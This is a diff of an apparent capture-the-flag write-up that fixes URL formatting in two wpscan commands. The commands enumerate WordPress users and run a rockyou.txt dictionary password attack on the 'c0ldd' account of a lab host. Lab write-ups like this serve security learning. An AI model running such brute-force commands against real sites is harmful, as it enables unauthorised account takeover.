@@ -25,7 +25,7 @@ Nmap done: 1 IP address (1 host up) scanned in 25.98 seconds
 Once we navigate to the webpage, we can see that it is hosted using WordPress. First, we can enumerate the WordPress users:
 
 ```
-wpscan --url [http://10.112.142.26](http://10.112.142.26) --enumerate u
+wpscan --url http://10.112.142.26 --enumerate u
 ```
 
 ```
@@ -54,7 +54,7 @@ wpscan --url [http://10.112.142.26](http://10.112.142.26) --enumerate u
 As we can see, we have successfully found several users. Now, we can try to launch a dictionary attack against these usernames (specifically the `c0ldd` username):
 
 ```
-wpscan --url [http://10.112.142.26](http://10.112.142.26) --usernames c0ldd --passwords ../rockyou.txt
+wpscan --url http://10.112.142.26 --usernames c0ldd --passwords ../rockyou.txt
 ```
 
 ```
